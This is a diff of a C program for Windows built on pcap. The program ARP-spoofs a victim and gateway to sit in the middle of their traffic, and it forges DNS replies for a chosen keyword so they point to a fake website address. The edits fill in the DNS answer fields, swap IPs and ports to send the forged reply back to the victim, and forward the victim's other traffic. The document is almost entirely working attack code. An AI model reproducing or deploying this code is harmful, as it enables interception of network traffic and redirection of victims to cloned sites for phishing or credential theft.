@@ -11,20 +11,37 @@
 
 static BOOL finished_infecting;
 send_params infect_params;
-static char* keyword = "netflix";
-u_long fake_web = 264000259; // TODO 
+static char* keyword = "ysite";
+u_long fake_web = 2130706433; // TODO 
+
+/* ethernet layer macros */
+#define SET_SRC_MAC(eth, mac) memcpy(eth->src_addr, mac, ETH_ALEN)
+#define SET_DST_MAC(eth, mac) memcpy(eth->dest_addr, mac, ETH_ALEN)
+#define COMPARE_MACS(mac1, mac2) memcmp(mac1, mac2,ETH_ALEN) == 0
+
+/* xor xor xor between ips */
+#define SWITCH_IPS(network_layer) network_layer->src_addr ^= network_layer->dest_addr;\
+network_layer->dest_addr ^= network_layer->src_addr;\
+network_layer->src_addr ^= network_layer->dest_addr
+
+/* xor xor xor between ports */
+#define SWITCH_PORTS(transport_layer) transport_layer->src_port ^= transport_layer->dst_port;\
+transport_layer->dst_port ^= transport_layer->src_port;\
+transport_layer->src_port ^= transport_layer->dst_port
 
 /*
 * @purpose: keep sending fake arp packets to maintain MITM.
 * @params: thread syntax.
 * @return 0.
+* 
 */
 static DWORD WINAPI start_arp_spoofing(
 	LPVOID lparam
 )
 {
 	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
-
+	ip_hdr* network_layer;
+	
 	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
 	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
 
@@ -101,7 +118,7 @@ static void stop_arp_spoofing()
 * 
 */
 static void change_packet_sizes(
-	u_char* packet, 
+	void* const packet, 
 	void* const end_packet
 )
 {
@@ -109,11 +126,14 @@ static void change_packet_sizes(
 	ip_hdr* ip_header;
 	udp_hdr* udp_header;
 
-	ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
-	udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
-
+	ip_header = (ip_hdr*)((BYTE*)packet + sizeof(ether_hdr));
+	udp_header = (udp_hdr*)((BYTE*)packet + sizeof(ether_hdr) + sizeof(ip_hdr));
+	
+	//ip_header->chksum = in_checksum(ip_header, sizeof(ip_hdr));
 	ip_header->length = htons((BYTE*)end_packet - (BYTE*)ip_header);
+
 	udp_header->len = htons((BYTE*)end_packet - (BYTE*)udp_header);
+	//udp_header->chksum = in_checksum(udp_header, (BYTE*)end_packet - (BYTE*)udp_header);
 }
 
 /*
@@ -135,6 +155,7 @@ static void* create_fake_dns_respones(
 	dns_answer answer = *(dns_answer*)pAnswerSection;
 
 	/* make dns constant header match the fake packet */
+	dns_header->flags = htons(0x8400);
 	dns_header->answers = htons(1); // one answer (fake)
 	dns_header->authority = 0;
 	dns_header->additional = 0;
@@ -142,6 +163,8 @@ static void* create_fake_dns_respones(
 	/* build the fake answer */
 	answer.name = htons((BYTE*)pQuestion - (BYTE*)pDnsSection);
 	answer.name |= 0xc0; //(b: 1100-0000) 
+	answer.cls = htons(1); // IN
+	answer.ttl = htonl(60); // minute.
 	answer.type = htons(1); // addr
 	answer.len = htons(4); //ipv4 addr in bytes
 	answer.addr = htonl(fake_web);
@@ -154,39 +177,41 @@ static void* create_fake_dns_respones(
 * @purpose: Checks if a DNS packet is intended for the specific cloned website.
 * If so changes the packet for DNS hijacking.
 * @params: packet - the network packet
-* @return: size of new packet (same size if not the DNS)
+* @return: true - if packet has changed, else false. 
+* 
+* (change packet_size param if packet changes)
 * 
 */
-static size_t dns_spoofing(
-	u_char* packet, 
-	size_t packet_size
+static int dns_spoofing(
+	u_char* const packet, 
+	size_t* packet_size
 )
 {
 	/* check if valid DNS packet */
 	ether_hdr* eth_header = (ether_hdr*)packet;
 	ip_hdr* ip_header = (ip_hdr*)(packet + sizeof(ether_hdr));
 	udp_hdr* udp_header = (udp_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr));
-	uint16_t questions;
 
 	if (eth_header->frame_type != htons(NETWORK_IPv4) // ipv4
 		|| ip_header->protocol != TRANSPORT_UDP // udp protocol
-		|| udp_header->src_port != htons(53)) // dns port
-		return packet_size;
+		|| udp_header->dst_port != htons(53)) // dns port
+		return 0; // false
 
 	/* locals */
+	void* temp_p = packet + *packet_size;
 	dns_hdr* dns_header = (dns_hdr*)(packet + sizeof(ether_hdr) + sizeof(ip_hdr) + sizeof(udp_hdr));
 	u_char* dns_data = (u_char*)dns_header + sizeof(dns_hdr);
-	void* temp_p = packet + packet_size;
+	uint16_t questions;
 	BOOL matching_found = 0;
 
 	questions = htons(dns_header->questions);
 	for (size_t i = 0; i < questions; i++)
 	{
-		/* checking for match */
+		/* checking for a match */
 		if (!matching_found)
 			if (strstr(dns_data, keyword))
 			{
-				/* keywords match */
+				/* keyword matches */
 				temp_p = (void*)dns_data;
 				matching_found = 1;
 			}
@@ -199,10 +224,10 @@ static size_t dns_spoofing(
 		temp_p = create_fake_dns_respones(dns_header, dns_data, temp_p);
 		/* change udp/ip header length fields */
 		change_packet_sizes(packet, temp_p);
-		finished_infecting = 1;
+		*packet_size = (BYTE*)temp_p - (BYTE*)packet;
+		//finished_infecting = 1;
 	}
-	
-	return (BYTE*)temp_p - packet;
+	return matching_found; // true if changed
 }
 
 void infect()
@@ -215,9 +240,7 @@ void infect()
 	pcap_if_t* alldevs = NULL, * adapter;
 	pcap_addr_t* addr;
 
-	char* filter;
-	size_t filter_size;
-	char temp_filter[] = "ip host";
+	char filter[100] = {0};
 	struct in_addr n_addr;
 	struct bpf_program fcode;
 
@@ -228,17 +251,13 @@ void infect()
 
 
 	/* allocate heap memory */
-	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
-	filter_size = strlen(temp_filter) + strlen(inet_ntoa(n_addr)) + 2; // space and null terminator (2).
-	filter = (char*)malloc(filter_size);
-
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
 	pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
 
 	pcap_findalldevs(&alldevs, NULL);
 
 	/* check if allocation worked successfully */
-	if (!pAdapterInfo || !filter || !alldevs)
+	if (!pAdapterInfo || !alldevs)
 		return -1;
 
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
@@ -262,46 +281,63 @@ void infect()
 	}
 
 	if (!adapter)
-		return -1;
+		return;
 
 	/*open the adapter*/
 	fp = pcap_open(
 		adapter->name,
 		65536,
 		PCAP_OPENFLAG_PROMISCUOUS,
-		1000,
+		0,
 		NULL,
 		NULL
 	);
 
+	infect_params.fp = fp;
+	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
+	//C4-E9-84-DB-87-03
 	/* create filter */
-	snprintf(filter, filter_size, "%s %s\n", temp_filter, inet_ntoa(n_addr));
+	n_addr.S_un.S_addr = htonl(infect_params.victim_ip);
+
+	snprintf(filter, 100, "%s %s %s %02X%02X%02X%02X%02X%02X\n", 
+		"ip host",
+		inet_ntoa(n_addr),
+		"and not ether src",
+		infect_params.adapter->Address[0],
+		infect_params.adapter->Address[1],
+		infect_params.adapter->Address[2],
+		infect_params.adapter->Address[3],
+		infect_params.adapter->Address[4],
+		infect_params.adapter->Address[5]
+	);
+
 	if (pcap_compile(fp, &fcode, filter, 1, netmask) < 0)
 	{
 		free(pAdapterInfo);
 		pcap_freealldevs(alldevs);
-		return -1;
+		pcap_close(fp);
+		return;
 	}
 
 	if (pcap_setfilter(fp, &fcode) < 0)
 	{
 		free(pAdapterInfo);
 		pcap_freealldevs(alldevs);
-		return -1;
+		pcap_close(fp);
+		return;
 	}
-
-	infect_params.fp = fp;
-	infect_params.adapter = corresponding_adapter(adapter, pAdapterInfo);
 
 	/*start send_packet thread*/
 	HANDLE hThread;
 	hThread = CreateThread(NULL, 0, start_arp_spoofing, NULL, 0, NULL);
 	if (!hThread)
 	{
+		free(pAdapterInfo);
+		pcap_freealldevs(alldevs);
 		pcap_close(fp);
-		return -1;
-	}
-
+		return;
+	}	
+	
 	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
 	{
 		/* Timeout elapsed */
@@ -315,17 +351,26 @@ void infect()
 			continue;
 		}
 
-		ether_hdr* eth_header;
-		eth_header = (ether_hdr*)pkt_data;
-
-		/* Check for DNS packets */
-		packet_size = dns_spoofing(pkt_data, pkt_header->caplen);
+		ether_hdr* eth_header = (ether_hdr*)pkt_data;
+		packet_size = pkt_header->caplen;
 
 		/* change packet src/dst (MITM) */
-		memcmp(eth_header->src_addr, infect_params.victim_mac, ETH_ALEN) == 0 // if src = taget
-			? memcpy(eth_header->dest_addr, infect_params.gateway_mac, ETH_ALEN) // (dst = gateway)
-			: memcpy(eth_header->dest_addr, infect_params.victim_mac, ETH_ALEN); // else (dst = victim) 
-		memcpy(eth_header->src_addr, infect_params.adapter->Address, ETH_ALEN); // src = this
+		if (COMPARE_MACS(eth_header->src_addr, infect_params.victim_mac)) // if src = taget
+		{	
+			/* check for DNS packets */
+			if (dns_spoofing(pkt_data, &packet_size))
+			{
+				/* changed pakcet */
+				SET_DST_MAC(eth_header, infect_params.victim_mac);
+				SWITCH_IPS(((ip_hdr*)(pkt_data + sizeof(ether_hdr))));
+				SWITCH_PORTS(((udp_hdr*)(pkt_data + sizeof(ether_hdr) + sizeof(ip_hdr))));
+			}
+			else
+				SET_DST_MAC(eth_header, infect_params.gateway_mac); // foward
+		}
+		else
+			SET_DST_MAC(eth_header, infect_params.victim_mac); // else (dst = victim)
+		SET_SRC_MAC(eth_header, infect_params.adapter->Address); // src = this
 
 		/* foward packet */
 		pcap_sendpacket(fp, pkt_data, packet_size);
